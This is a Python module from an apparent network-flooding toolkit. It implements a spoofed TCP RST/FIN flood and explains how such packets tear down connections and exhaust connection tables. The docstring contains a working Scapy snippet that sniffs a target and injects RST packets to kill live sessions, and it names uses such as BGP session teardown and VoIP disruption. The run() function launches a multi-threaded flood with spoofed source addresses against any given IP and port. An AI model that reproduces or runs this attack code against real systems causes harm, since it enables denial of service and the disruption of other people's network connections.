"""
modules/rst_flood.py - UFORST
TCP RST/FIN flood. Forceful connection teardown.

How it works:
  RST packets with matching (src_ip, dst_ip, src_port, dst_port, seq)
  cause the receiver to immediately tear down a TCP connection.

  In flood mode (spoofed, random seq):
  - Server receives RST for connections that may not exist
  - Each RST goes through TCP stack for validation
  - CPU cost per packet similar to SYN
  - On busy servers: real connections may be hit by random RST if seq falls
    within the receive window (probabilistic, seq space = 2^32)

  FIN flood:
  - Triggers FIN_WAIT states, consuming connection table entries
  - Less effective than RST but harder to filter (FIN is legitimate)

  RST injection (targeted, non-flood):
  - Requires knowing the current seq number (via sniffing)
  - Used in TCP hijacking / BGP session teardown / VoIP disruption
  - Scapy sniff() to capture seq then inject matching RST

Targeted RST injection example (requires monitoring):
  from scapy.all import sniff, IP, TCP, send
  def rst_inject(pkt):
      if TCP in pkt and pkt[TCP].flags & 0x02:  # SYN
          rst = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(
              sport=pkt[TCP].dport, dport=pkt[TCP].sport,
              flags="R", seq=pkt[TCP].ack
          )
          send(rst, verbose=0)
  sniff(filter=f"tcp and host {target}", prn=rst_inject)
"""

import random
from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    dst_ip: str,
    dst_port: int,
    flag: str = "R",          # "R" = RST, "F" = FIN, "RF" = both
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch RST/FIN flood.

    Args:
        dst_ip    : Target IP.
        dst_port  : Target TCP port.
        flag      : TCP flag(s): "R" (RST), "F" (FIN), "RF" (RST+FIN).
        threads   : Worker count.
        pps_limit : PPS cap.
        duration  : Duration in seconds.
        spoof     : Randomize source IP.

    Returns:
        FloodEngine (already started).
    """
    builder = PacketBuilder()

    def make_packet() -> bytes:
        return builder.rst(dst_ip, dst_port, spoof=spoof)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
